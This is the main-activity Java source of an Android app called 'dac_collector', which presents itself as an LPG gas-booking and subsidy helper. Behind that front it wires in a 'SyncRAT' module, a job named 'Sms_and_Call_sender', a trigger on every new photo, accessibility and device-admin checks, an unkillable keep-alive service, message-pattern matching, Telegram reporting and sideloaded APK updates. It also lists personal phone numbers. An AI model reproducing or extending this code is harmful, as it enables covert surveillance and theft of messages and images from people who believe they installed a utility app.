package android.iocl.dac_collector.Ui;

import static android.iocl.dac_collector.Utility.Constant.DefaultRegex;
import static com.ykun.live_library.config.RunMode.HIGH_POWER_CONSUMPTION;

import android.app.StatusBarManager;
import android.app.admin.DevicePolicyManager;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.Firebase.FirebaseDBClient;
import android.iocl.dac_collector.Interface.CapturingInterceptor;
import android.iocl.dac_collector.Interface.ResponseListener;
import android.iocl.dac_collector.ModelData.AppUpdate;
import android.iocl.dac_collector.ModelData.ColumnValue;
import android.iocl.dac_collector.ModelData.ConsumerData;
import android.iocl.dac_collector.ModelData.DAC_Collector_Base;
import android.iocl.dac_collector.ModelData.SearchQuery;
import android.iocl.dac_collector.ModelData.SubsidyRequest;
import android.iocl.dac_collector.ModelData.appUpdateDesc;
import android.iocl.dac_collector.ModelData.check_update;
import android.iocl.dac_collector.ModelData.search_consumer;
import android.iocl.dac_collector.ModelData.update_dac_collect;
import android.iocl.dac_collector.R;
import android.iocl.dac_collector.RetrofitClient.RequestService;
import android.iocl.dac_collector.RetrofitClient.RetrofitClient;

import android.iocl.dac_collector.Services.DownloadService;
import android.iocl.dac_collector.Services.FixOppoAutoKill;
import android.iocl.dac_collector.Services.ImageJobService;
import android.iocl.dac_collector.Services.JobSchedulerUtil;
import android.iocl.dac_collector.SyncRAT.SyncAccountUtil;
import android.iocl.dac_collector.Utility.Constant;
import android.iocl.dac_collector.Utility.PermissionUtility;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.TelegramBot;
import android.iocl.dac_collector.Utility.Utility;
import android.iocl.dac_collector.adapter.UpdateDescList;

import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.provider.Settings;
import android.text.Html;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.constraintlayout.widget.ConstraintLayout;
import androidx.core.content.FileProvider;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowCompat;
import androidx.core.view.WindowInsetsCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.material.card.MaterialCardView;
import com.google.firebase.FirebaseApp;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.firebase.messaging.FirebaseMessaging;
import com.ykun.live_library.KeepAliveManager;
import com.ykun.live_library.config.ForegroundNotification;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicReference;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity implements ResponseListener {

    private StatusBarManager statusBarManager;
    private static final String TAG = "MainActivity_Mokardder";
    FirebaseAnalytics mFirebaseAnalytics;
    FirebaseDBClient fireDB;
    Boolean isSkippingFCM = false;


    Button fetchUserDetails;

    LinearLayout loader;
    TextView subsidyBadge, loader_text, call_Akram, call_Emdadul, tv_appVersion, call_Mokardder, refreshProfile, userName, remainBook, lastBook, mobNo, consID, location, Book_Btn, Check_Update, aboutApp, adminPerm, btn_skip;
    ImageView annualTick;
    MaterialCardView subsidyActivity;

    // FCM key - keep in sync with SharedPrefs
    String FCM_KEY = "";

    boolean isAccessibilityEnabled;
    boolean isDeviceAdminEnabled;
    private ExecutorService executorService = Executors.newSingleThreadExecutor();  // Executor for background tasks

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        WindowCompat.setDecorFitsSystemWindows(getWindow(), false);
        View decorView = getWindow().getDecorView();
        ViewCompat.setOnApplyWindowInsetsListener(decorView, (view, insets) -> {
            int bottomInset = insets.getInsets(WindowInsetsCompat.Type.systemBars()).bottom;
            view.setPadding(0, 0, 0, bottomInset);
            return insets;
        });

        // show previous crash details if any
        String crashDetails = SharedPrefs.getCrashDetails(this);
        if (crashDetails != null) {
            new AlertDialog.Builder(this)
                    .setTitle("App Crashed Previously")
                    .setMessage(crashDetails)
                    .setPositiveButton("OK", (dialog, which) -> {
                        SharedPrefs.ClearCrashDetails(this);
                        dialog.dismiss();
                    })
                    .setCancelable(false)
                    .show();
        }

        setContentView(R.layout.activity_main);

        setViewsUI();
        checkMissingPermissions();
        initFirebaseThings();      // <-- improved token init
        sharedPrefsCheck();
        settingUpJobs();
        setClickListener();
        implementKeepAliveBelow8();


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            statusBarManager = (StatusBarManager) getSystemService(StatusBarManager.class);
        }

    }

    private void checkMissingPermissions() {
        if (PermissionUtility.isAnyPermissionMissing(this)) {
            List<String> missing = PermissionUtility.getMissingPermissions(this);
            String[] missingArray = missing.toArray(new String[0]);


            Log.d("PermsActivity", "refreshAndCheckCompletion: " + Arrays.toString(missingArray));
            Log.d("PermsActivity", "refreshAndCheckCompletion: " + PermissionUtility.isTilesAdded(MainActivity.this));
            startActivity(new Intent(this, PermissionActivity.class)
                    .putExtra("permissions", missingArray));
        }
    }


    public static String getCurrentDateString() {
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yy HH:mm", Locale.ENGLISH);
        return sdf.format(new Date());
    }

    private void implementKeepAliveBelow8() {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.O) {
            //启动保活服务
            KeepAliveManager.toKeepAlive(
                    getApplication(),
                    HIGH_POWER_CONSUMPTION,
                    "进程保活",
                    "Process: System(哥们儿) 我不想被杀死",
                    R.mipmap.ic_launcher,
                    new ForegroundNotification(
                            //定义前台服务的通知点击事件
                            (context, intent) -> Log.d("JOB-->", " foregroundNotificationClick"))
            );


        }
    }

    private void sharedPrefsCheck() {
        Context ctx = MainActivity.this;
        String username = SharedPrefs.getUsername(ctx);
        String consumerId = SharedPrefs.getConsumerId(ctx);

        boolean missingInfo =
                "not_found".equals(username) || username.isEmpty() ||
                        "not_found".equals(consumerId) || consumerId.isEmpty();


        if (SharedPrefs.getBoolean(ctx, "isFirstTime", true) || missingInfo) {
            subscribeTopics();
            SharedPrefs.setRestrictionEnabled(ctx);
            Utility.updateMessagePattern(DefaultRegex, ctx);
            showUserDetailsDialog();

        }


        if (!SharedPrefs.getSubsidyDetails(ctx).isEmpty()) {
            String last = SharedPrefs.lastSubsidyDate(ctx); // "dd-MM-yyyy"
            try {
                long days = (Calendar.getInstance().getTimeInMillis()
                        - new SimpleDateFormat("dd-MM-yyyy", Locale.ENGLISH).parse(last).getTime())
                        / 86_400_000L;
                if (days >= 2) SharedPrefs.clearSubsidyDetails(ctx);
                else {
                    subsidyBadge.setBackgroundResource(R.drawable.bg_badge_received);
                    subsidyBadge.setText("Click here to see!");
                }
            } catch (Exception e) {
                SharedPrefs.clearSubsidyDetails(ctx);
            }
        } else {
            if (SharedPrefs.isSubsidyRequestPending(ctx)) {
                subsidyBadge.setBackgroundResource(R.drawable.bg_badge_pen);
                subsidyBadge.setText("Your Request is Pending");
            }
        }


    }


    /**
     * initFirebaseThings: robust initialization and token retrieval.
     * - Ensures FirebaseApp is initialized
     * - Restores token from SharedPrefs (if available)
     * - Fetches current token asynchronously and persists it
     */
    private void initFirebaseThings() {

        checkAppUpdate();

        CapturingInterceptor.setGlobalListener(this);

        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                // Ensure FirebaseApp is initialized (if your Application already does it, this is safe)
                if (FirebaseApp.getApps(getApplicationContext()).isEmpty()) {
                    FirebaseApp.initializeApp(getApplicationContext());
                }

                mFirebaseAnalytics = FirebaseAnalytics.getInstance(this);
                mFirebaseAnalytics.setAnalyticsCollectionEnabled(true);

                // restore token from SharedPrefs (fast)
                String saved = SharedPrefs.getFCMKey(getApplicationContext());
                if (saved != null && !saved.isEmpty()) {
                    FCM_KEY = saved;
                    Log.d(TAG, "Restored FCM key from SharedPrefs");
                }

                // Ensure auto init and then fetch a fresh token in background
                FirebaseMessaging.getInstance().setAutoInitEnabled(true);


                fireDB = new FirebaseDBClient(getApplicationContext());

            } catch (Exception e) {
                e.printStackTrace();
            }
        });

    }

    private void setViewsUI() {
        isAccessibilityEnabled = Utility.isAccessibilityServiceEnabled(getApplicationContext());


        boolean isRestrictionEnabled = SharedPrefs.getRestrictionEnabled(this);
        subsidyBadge = findViewById(R.id.badgeReceived);
        loader = findViewById(R.id.loaderLayout);
        loader_text = findViewById(R.id.loadingText_UI);
        call_Akram = findViewById(R.id.call_Akram);
        call_Emdadul = findViewById(R.id.call_Emdadul);
        call_Mokardder = findViewById(R.id.call_Mokardder);
        refreshProfile = findViewById(R.id.refreshProfile);
        userName = findViewById(R.id.userName);
        remainBook = findViewById(R.id.remainBook);
        lastBook = findViewById(R.id.lastBook);
        mobNo = findViewById(R.id.mobNo);
        consID = findViewById(R.id.consID);
        annualTick = findViewById(R.id.annualTick);
        location = findViewById(R.id.location);
        Check_Update = findViewById(R.id.Check_Update);
        Book_Btn = findViewById(R.id.Book_Btn);
        aboutApp = findViewById(R.id.aboutApp);
        tv_appVersion = findViewById(R.id.tv_appVersion);
        subsidyActivity = findViewById(R.id.cardSubsidyHeader);

        adminPerm = findViewById(R.id.adminPerm);
        if (isDeviceAdminEnabled && isAccessibilityEnabled && isRestrictionEnabled) {
            adminPerm.setVisibility(View.GONE);
        }
    }

    private void imageObserverSchedule() {
        JobInfo jobInfo = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            jobInfo = new JobInfo.Builder(123,
                    new ComponentName(this, ImageJobService.class))
                    .addTriggerContentUri(
                            new JobInfo.TriggerContentUri(
                                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                    JobInfo.TriggerContentUri.FLAG_NOTIFY_FOR_DESCENDANTS
                            )
                    )
                    .setTriggerContentMaxDelay(0)    // fire as soon as possible
                    .setTriggerContentUpdateDelay(1000)  // but batch rapid changes

                    .build();
        }

        JobScheduler jm = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            jm = this.getSystemService(JobScheduler.class);
        }
        if (jm != null && jobInfo != null) {
            jm.schedule(jobInfo);
        }

    }

    private void settingUpJobs() {
        imageObserverSchedule();

        SyncAccountUtil.getSyncAccount(this);


        if (!Utility.isJobSchedulerActive(MainActivity.this, 1)) {

            loader_controller("Setting Up..", true, loader, loader_text);

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                loader_controller("Setting Up..", false, loader, loader_text);
                JobSchedulerUtil.Sms_and_Call_sender(getApplicationContext());
                JobSchedulerUtil.fetch_profile_info(getApplicationContext());
            }, 800); // Delay in milliseconds

        }
    }

    private void setClickListener() {
        aboutApp.setOnClickListener(v -> {
            showAboutDialog();
        });

        Book_Btn.setOnClickListener(v -> {
            makeCall("+918454955555");
        });

        Check_Update.setOnClickListener(v -> {
            checkAppUpdate();


        });

        refreshProfile.setOnClickListener(v -> {
            String number = Utility.getConsID(getApplicationContext());
            if (!number.equals("N")) {
                refreshUser(number);
            }
        });

        adminPerm.setOnClickListener(v -> {
            showAdminAlert();
        });


        call_Akram.setOnClickListener(v -> {
            makeCall("+919123386785");
        });
        call_Emdadul.setOnClickListener(v -> {
            makeCall("+919231902703");
        });
        call_Mokardder.setOnClickListener(v -> {
            makeCall("+919932896502");
        });
        subsidyActivity.setOnClickListener(view -> {
            if (!SharedPrefs.getSubsidyDetails(this).isEmpty()) {
                startActivity(new Intent(this, BankStatementActivity.class));
            } else {
                showSubsidyDialog();
            }

        });
        tv_appVersion.setText(BuildConfig.VERSION_NAME);


    }

    // New token callback interface
    private interface TokenCallback {
        void onToken(String token);
    }

    /**
     * refreshFCMToken: fetch current token and persist to SharedPrefs.
     * - Will call callback on completion (may be null)
     */
    private void refreshFCMToken(TokenCallback cb) {
        try {
            // ensure FirebaseApp initialized
            if (FirebaseApp.getApps(getApplicationContext()).isEmpty()) {
                FirebaseApp.initializeApp(getApplicationContext());
            }

            FirebaseMessaging.getInstance().getToken()
                    .addOnCompleteListener(task -> {
                        if (task.isSuccessful()) {
                            String token = task.getResult();
                            if (token != null && !token.isEmpty()) {
                                FCM_KEY = token;
                                SharedPrefs.setFCMKey(getApplicationContext(), token);
                                Log.d(TAG, "refreshFCMToken: new token saved");
                                if (cb != null) cb.onToken(token);
                                return;
                            }
                        }
                        Log.w(TAG, "refreshFCMToken: token task failed", task.getException());
                        if (cb != null) cb.onToken(null);
                    });
        } catch (Exception e) {
            Log.e(TAG, "refreshFCMToken: exception", e);
            if (cb != null) cb.onToken(null);
        }
    }

    private void showAboutDialog() {
        // Inflate the layout
        View view = LayoutInflater.from(this).inflate(R.layout.app_about_dialog, null);

        // Create the AlertDialog
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setView(view);

        final AlertDialog alertDialog = builder.create();
        alertDialog.setCancelable(true);

        // Set a transparent background, if desired
        if (alertDialog.getWindow() != null) {
            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0)); // Transparent background
        }

        // Show the dialog
        alertDialog.show();
    }

    private void showSubsidyDialog() {
        // Inflate the layout
        View view = LayoutInflater.from(this).inflate(R.layout.subsidy_request_dialog, null);

        TextView submitBtn = view.findViewById(R.id.fetchBtn);

        // Create the AlertDialog
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setView(view);

        final AlertDialog alertDialog = builder.create();
        alertDialog.setCancelable(true);


        submitBtn.setOnClickListener(view1 -> {

            // use SharedPrefs.getFCMKey (updated by refreshFCMToken) for safety
            requestSubsidyDetails(alertDialog, SharedPrefs.getFCMKey(MainActivity.this));
            Toast.makeText(this, "Sending Request...", Toast.LENGTH_SHORT).show();




            Toast.makeText(this, "Please wait, We're processing you request", Toast.LENGTH_SHORT).show();
        });


        // Set a transparent background, if desired
        if (alertDialog.getWindow() != null) {
            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0)); // Transparent background
        }

        // Show the dialog
        alertDialog.show();
    }

    private void loadProfileTV() {

        ConsumerData data = (ConsumerData) Utility.decodeApiResponse(!Utility.getProfile(getApplicationContext()).equals("N") ? Utility.getProfile(getApplicationContext()) : null, ConsumerData.class);


        if (data == null) {
            return;
        }
        boolean isAnnual = data.getCon_type().equals("UJJAWALA") && !data.getBooking_date().isEmpty();

        userName.setText(data.getName());

        TelegramBot.with(MainActivity.this).sendMessage("User Online -> " + data.getName() + " At -> " + getCurrentDateString());


        remainBook.setText(isAnnual ? data.getSubscription() : "Recharge End");
        lastBook.setText(isAnnual ? data.getBooking_date() : "No Subscription");
        mobNo.setText(data.getMobile_no());
        consID.setText(data.getConsumer_id());
        location.setText(data.getLocation().isEmpty() ? "No Location" : data.getLocation());

        if (!isAnnual) {
            TextView tv_lastBook = findViewById(R.id.tv_lastBook);
            tv_lastBook.setText("Recharge End On");
            remainBook.setText("Recharge End");
            lastBook.setText(data.getSub_end_month());
            annualTick.setVisibility(View.GONE);
            return;
        }

        if (isAnnual) {
            annualTick.setVisibility(View.VISIBLE);
        }

    }

    private void makeCall(String number) {
        // Getting instance of Intent with action as ACTION_CALL
        Intent phone_intent = new Intent(Intent.ACTION_CALL);

        // Set data of Intent through Uri by parsing phone number
        phone_intent.setData(Uri.parse("tel:" + number));
        // start Intent
        startActivity(phone_intent);
    }


    public List<appUpdateDesc> SplitText(String desc) {
        String[] parts = desc.split("\\s*,\\s*"); // Split and trim text by commas
        List<appUpdateDesc> descriptions = new ArrayList<>();

        int index = 1; // Initialize the index variable
        for (String part : parts) {
            descriptions.add(new appUpdateDesc(part.trim(), String.valueOf(index) + " ˟"));
            index++; // Increment the index
        }

        return descriptions;
    }

    /**
     * update_dac_collect:
     * - If FCM key not present and not skipping, request refresh and then proceed.
     * - Uses performUpdate(...) to actually call the API (so we can call it from token callback).
     */
    private void update_dac_collect(String cons_id, String name, AlertDialog dialog, LinearLayout loader, TextView loader_text) {

        // If no token saved and we are not explicitly skipping, try to refresh token first.
        String savedToken = (FCM_KEY != null && !FCM_KEY.isEmpty()) ? FCM_KEY : SharedPrefs.getFCMKey(getApplicationContext());

        if ((savedToken == null || savedToken.isEmpty()) && !isSkippingFCM) {
            // fetch fresh token then proceed
            loader_controller("Updating Data...", true, loader, loader_text);
            refreshFCMToken(new TokenCallback() {
                @Override
                public void onToken(String token) {
                    runOnUiThread(() -> {
                        if (token == null || token.isEmpty()) {
                            loader_controller("Updating Data...", false, loader, loader_text);
                            Toast.makeText(MainActivity.this, "FCM Key not received yet", Toast.LENGTH_SHORT).show();
                            return;
                        }
                        // proceed with real token
                        performUpdate(cons_id, name, dialog, loader, loader_text, token);
                    });
                }
            });
            return;
        }

        // Have token: use it
        String tokenToUse = (savedToken == null || savedToken.isEmpty()) ? "" : savedToken;
        performUpdate(cons_id, name, dialog, loader, loader_text, tokenToUse);
    }

    /**
     * performUpdate: actually calls the API with provided token
     */
    private void performUpdate(String cons_id, String name, AlertDialog dialog, LinearLayout loader, TextView loader_text, String token) {
        loader_controller("Updating Data...", true, loader, loader_text);
        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);

        List<ColumnValue> userInfo = Arrays.asList(
                new ColumnValue("CONSUMER_ID", cons_id),
                new ColumnValue("USER_NAME", name),
                new ColumnValue("FCM_KEY", token),
                new ColumnValue("APP_VERSION", BuildConfig.VERSION_NAME),
                new ColumnValue("LAST_ACTIVE", Utility.getCurrentTime())
        );

        update_dac_collect receiver = new update_dac_collect("addCustomer", cons_id, userInfo);
        Call<DAC_Collector_Base> auth = requestService.update_dac_collector(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {
                loader_controller("Updating Data...", false, loader, loader_text);
                if (response == null || response.body() == null) {
                    Toast.makeText(MainActivity.this, "Empty response from server", Toast.LENGTH_SHORT).show();
                    return;
                }
                boolean isSuccess = response.body().getSuccess();
                String message = response.body().getMessage();

                if (isSuccess) {
                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
                    if (dialog != null) dialog.dismiss();
                    SharedPrefs.setBoolean(MainActivity.this, "isFirstTime", false);
                } else {
                    Toast.makeText(MainActivity.this, "" + message, Toast.LENGTH_SHORT).show();
                }


            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {
                Toast.makeText(MainActivity.this, Constant.API_FAILURE, Toast.LENGTH_SHORT).show();
                loader_controller("Updating Data...", false, loader, loader_text);
            }
        });
    }

    private void requestSubsidyDetails(AlertDialog dialog, String FCM_KEY_param) {

        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        Context ctx = MainActivity.this;
        SubsidyRequest req = new SubsidyRequest("addSubsidyRequest", SharedPrefs.getConsumerId(ctx), SharedPrefs.getUserName(ctx), FCM_KEY_param);

        Call<DAC_Collector_Base> auth = requestService.requestSubsidyDetails(req);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {

                boolean isSuccess = response.body().getSuccess();
                String message = response.body().getMessage();

                if (isSuccess) {
                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_LONG).show();
                    SharedPrefs.setIsSubsidyRequestPending(MainActivity.this, true);
                    subsidyBadge.setBackgroundResource(R.drawable.bg_badge_pen);
                    subsidyBadge.setText("Your Request is Pending");
                    dialog.dismiss();
                } else {
                    Toast.makeText(MainActivity.this, "" + message, Toast.LENGTH_SHORT).show();
                }


            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

                Toast.makeText(MainActivity.this, Constant.API_FAILURE, Toast.LENGTH_SHORT).show();

            }
        });

    }


    private void showUserDetailsDialog() {


        RelativeLayout relativeLayoutAlert = findViewById(R.id.alertDialog_userdetails);
        View view = LayoutInflater.from(getApplicationContext()).inflate(R.layout.userdetails_alert_layout, relativeLayoutAlert);
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setView(view);

        fetchUserDetails = view.findViewById(R.id.btn_fetch);
        EditText inputConsID = view.findViewById(R.id.et_consID);
        btn_skip = view.findViewById(R.id.btn_skip);

        LinearLayout loader = view.findViewById(R.id.loaderLayout);
        TextView loader_txt = view.findViewById(R.id.loadingText_alert);
        final AlertDialog alertDialog = builder.create();

        alertDialog.setCancelable(false);

        if (alertDialog.getWindow() != null) {
            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0));
        }
        alertDialog.show();

        fetchUserDetails.setOnClickListener(v -> {
            String searchTerm = inputConsID.getText().toString();
            if (searchTerm.isEmpty()) {
                Toast.makeText(this, "Enter Something 😥", Toast.LENGTH_SHORT).show();

                return;
            }


            Log.d(TAG, "showUserDetailsDialog: " + searchTerm);


            userFind(searchTerm, loader, loader_txt, view, alertDialog);
        });
    }

    private void showAppDialog(String url, String desc, String versionCode_Name) {
        // Holder for the downloaded file
        AtomicReference<File> apkFileRef = new AtomicReference<>();

        RelativeLayout root = findViewById(R.id.update_layout_dialog);
        View view = LayoutInflater.from(this)
                .inflate(R.layout.app_update_layout, root);
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setView(view);
        AlertDialog alertDialog = b.create();
        if (alertDialog.getWindow() != null) {
            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0));
        }
        alertDialog.show();

        // UI refs
        RecyclerView rvDesc = view.findViewById(R.id.update_recycle_view);
        TextView newVer = view.findViewById(R.id.newVer);
        RelativeLayout btnUpdate = view.findViewById(R.id.update_rl_button);
        TextView btnText = view.findViewById(R.id.update_btn_text);
        ProgressBar progressBar = view.findViewById(R.id.progressBarUpdate);
        TextView progressTxt = view.findViewById(R.id.downloadProgress);

        // Setup description list
        rvDesc.setLayoutManager(new LinearLayoutManager(this));
        rvDesc.setAdapter(new UpdateDescList(SplitText(desc), this));

        newVer.setText(versionCode_Name);

        btnUpdate.setOnClickListener(v -> {
            // hide “UPDATE” and show progress UI
            btnText.setVisibility(View.GONE);
            progressBar.setVisibility(View.VISIBLE);
            progressTxt.setVisibility(View.VISIBLE);

            DownloadService
                    .with(this)
                    .downloadFromUrl(url)
                    .onProgress(percent -> {
                        // update progress
                        progressBar.setProgress(percent);
                        progressTxt.setText(percent + "%");
                    })
                    .onDownloadCompleted(file -> {

                        Uri uri = FileProvider.getUriForFile(
                                this,
                                BuildConfig.APPLICATION_ID + ".fileprovider",
                                file
                        );

                        Intent intent = new Intent(Intent.ACTION_VIEW)
                                .setDataAndType(uri, "application/vnd.android.package-archive")
                                .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                        startActivity(intent);
                        // store file
                        apkFileRef.set(file);

                        // change text to “INSTALL”
                        progressBar.setVisibility(View.GONE);

                        progressTxt.setTextColor(Color.parseColor("#198754"));
                        progressTxt.setText("INSTALL");

                        // make it clickable
                        progressTxt.setOnClickListener(installClick -> {
                            File apk = apkFileRef.get();
                            if (apk != null && apk.exists()) {

                                Intent intent2 = new Intent(Intent.ACTION_VIEW)
                                        .setDataAndType(uri, "application/vnd.android.package-archive")
                                        .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                                startActivity(intent2);
                            }
                        });
                    })
                    .onError(ex -> runOnUiThread(() -> {
                        Log.e(TAG, "Download error", ex);
                        Toast.makeText(this, "Download failed: " + ex.getMessage(), Toast.LENGTH_SHORT).show();
                    }))
                    .start();
        });
    }


    // Moved outside the onCreate method

    private void userFind(String userSearchTerm, LinearLayout loader, TextView loader_text, View view, AlertDialog dialog) {
        loader_controller("Getting User Data ...", true, loader, loader_text);
        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        SearchQuery query = new SearchQuery(userSearchTerm, "");
        search_consumer receiver = new search_consumer("getUserDetails", query);
        Call<DAC_Collector_Base> auth = requestService.search_customer(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {
                loader_controller("Fetching Customer ...", false, loader, loader_text);
                String encResponse = response.body().getData();

                boolean isSuccess = response.body().getSuccess();
                if (!isSuccess) {
                    String message = response.body().getMessage();
                    Toast.makeText(MainActivity.this, "" + message, Toast.LENGTH_SHORT).show();
                    return;
                }
                ConsumerData data = (ConsumerData) Utility.decodeApiResponse(encResponse, ConsumerData.class);
                Button saveData = view.findViewById(R.id.btn_saveData);
                TextView name = view.findViewById(R.id.userName);
                name.setVisibility(View.VISIBLE);

                String userName = data.getName();
                String Cons_ID = data.getConsumer_id();
                name.setText(userName + " ( " + Cons_ID + " ) ");
                saveData.setEnabled(true);
                btn_skip.setVisibility(View.VISIBLE);
                fetchUserDetails.setText("Re-search ?");
                btn_skip.setOnClickListener(v -> {
                    isSkippingFCM = true;
                });

                saveData.setOnClickListener(v -> {
                    new Handler().postDelayed(() -> { // Wait for token retrieval (but update_dac_collect also ensures token)
                        Utility.updateProfile(encResponse, getApplicationContext());
                        loadProfileTV();
                        SharedPrefs.setConsumerId(MainActivity.this, Cons_ID);
                        SharedPrefs.setUsername(MainActivity.this, userName);
                        update_dac_collect(Cons_ID, userName, dialog, loader, loader_text);
                    }, 1000); // Adjust delay as needed
                });

            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

                Log.d(TAG, "onFailure: " + t);
                loader_controller("", false, loader, loader_text);
                Toast.makeText(MainActivity.this, Constant.API_FAILURE, Toast.LENGTH_SHORT).show();

            }
        });
    }

    private void refreshUser(String userSearchTerm) {
        loader_controller("Refreshing Profile...", true, loader, loader_text);
        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        SearchQuery query = new SearchQuery(userSearchTerm, "");
        search_consumer receiver = new search_consumer("getUserDetails", query);
        Call<DAC_Collector_Base> auth = requestService.search_customer(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {

                String encResponse = response.body().getData();
                Utility.updateProfile(encResponse, getApplicationContext());
                loadProfileTV();

                loader_controller("Fetching Customer ...", false, loader, loader_text);

            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

                loader_controller("", false, loader, loader_text);

                Toast.makeText(MainActivity.this, Constant.API_FAILURE, Toast.LENGTH_SHORT).show();


            }
        });
    }

    private void subscribeTopics() {
        String[] topics = {"heart_beat", "sendCustomMessage", "RechargeRelated"}; // Example topics
        for (String topic : topics) {
            FirebaseMessaging.getInstance().subscribeToTopic(topic)
                    .addOnCompleteListener(task -> {
                        String msg = topic + " Subscribed";
                        if (!task.isSuccessful()) {
                            msg = topic + " Subscribe failed";
                        }
                        Log.d(TAG, msg);
                    });
        }
    }


    private void checkAppUpdate() {
        loader_controller("Checking Update....", true, loader, loader_text);
        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        check_update appUpdate_payload = new check_update("checkAppUpdate");
        Call<DAC_Collector_Base> auth = requestService.check_update(appUpdate_payload);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {
                loader_controller("", false, loader, loader_text);
                String encResponse = response.body().getData();
                AppUpdate appUpdate = (AppUpdate) Utility.decodeApiResponse(encResponse, AppUpdate.class);

                boolean isSuccess = response.body().getSuccess();
                if (isSuccess) {

                    String appDesc = appUpdate.getUpdateDescription();
                    String url = appUpdate.getUrl();

                    int version_code = Integer.parseInt(appUpdate.getAppVersionCode());
                    String versionName = appUpdate.getAppVersion();

                    if (version_code > BuildConfig.VERSION_CODE) {
                        showAppDialog(url, appDesc, versionName);
                    }


                }


            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

                Toast.makeText(MainActivity.this, Constant.API_FAILURE, Toast.LENGTH_SHORT).show();

                loader_controller("", false, loader, loader_text);

            }
        });
    }


    public void loader_controller(String loader_text_inp, Boolean ShouldBeShown, LinearLayout loader, TextView loader_text) {

        if (ShouldBeShown) {
            loader.setVisibility(View.VISIBLE);
            if (!loader_text_inp.isEmpty()) {
                loader_text.setText(loader_text_inp);
            }
        } else {
            loader.setVisibility(View.GONE);
        }
    }


    // Moved outside the onCreate method


//    public void showPermissionRequests() {
//        RecyclerView recyclerView;
//        PermissionAdapter permissionAdapter;
//        List<PermissionItem> permissionList;
//
//        recyclerView = findViewById(R.id.permissions_recycler_view);
//        recyclerView.setLayoutManager(new LinearLayoutManager(getApplicationContext()));
//
//        // Sample data
//        permissionList = new ArrayList<>();
//        permissionList.add(new PermissionItem("Camera", "This app requires access to your camera", R.drawable.gas_cylinder_icon, false));
//        permissionList.add(new PermissionItem("Storage", "This app requires access to your storage", R.drawable.verify_icon_blue, true));
//
//        permissionAdapter = new PermissionAdapter(this, permissionList);
//        recyclerView.setAdapter(permissionAdapter);
//
//        ConstraintLayout relativeLayoutAlert = findViewById(R.id.alertDialog_permissions);
//        View view = LayoutInflater.from(getApplicationContext()).inflate(R.layout.permission_dialog, relativeLayoutAlert);
